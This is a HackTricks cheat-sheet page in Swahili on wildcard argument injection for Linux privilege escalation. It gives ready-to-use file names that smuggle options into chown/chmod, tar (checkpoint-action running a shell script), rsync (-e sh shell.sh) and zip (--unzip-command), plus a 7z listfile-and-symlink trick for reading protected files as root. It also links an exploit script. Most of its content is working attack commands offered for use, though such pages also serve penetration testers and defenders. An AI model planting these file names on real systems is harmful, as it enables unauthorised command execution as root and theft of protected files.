<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


## chown, chmod

Unaweza **kuonyesha mmiliki wa faili na ruhusa unayotaka kunakili kwa faili zingine zote**
```bash
touch "--reference=/my/own/path/filename"
```
Unaweza kutumia hii kwa kutumia [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(shambulio lililounganishwa)_\
Maelezo zaidi katika [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Tekeleza amri za kiholela:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Unaweza kutumia hii kwa kufaidika na [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(shambulio la tar)_\
Maelezo zaidi katika [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Tekeleza amri za kiholela:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Unaweza kutumia hii kwa kutumia [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_shambulio la rsync)_\
Maelezo zaidi katika [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Katika **7z** hata kwa kutumia `--` kabla ya `*` (kumbuka kuwa `--` inamaanisha kuwa kuingia inayofuata haiwezi kutibiwa kama vigezo, kwa hivyo ni njia za faili tu katika kesi hii) unaweza kusababisha kosa la kusoma faili, kwa hivyo ikiwa amri kama ifuatayo inatekelezwa na root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Na unaweza kuunda faili katika saraka ambapo hii inatekelezwa, unaweza kuunda faili `@root.txt` na faili `root.txt` ikiwa ni **symlink** kwa faili unayotaka kusoma:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Kisha, wakati **7z** inatekelezwa, itaichukulia `root.txt` kama faili inayojumuisha orodha ya faili ambazo inapaswa kuzipiga (ndio maana ya uwepo wa `@root.txt`) na wakati 7z inasoma `root.txt` itasoma `/file/you/want/to/read` na **kwa kuwa maudhui ya faili hii sio orodha ya faili, itatoa kosa** kuonyesha maudhui.

_Maelezo zaidi katika Write-ups ya sanduku la CTF kutoka HackTheBox._

## Zip

**Tekeleza amri za aina yoyote:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
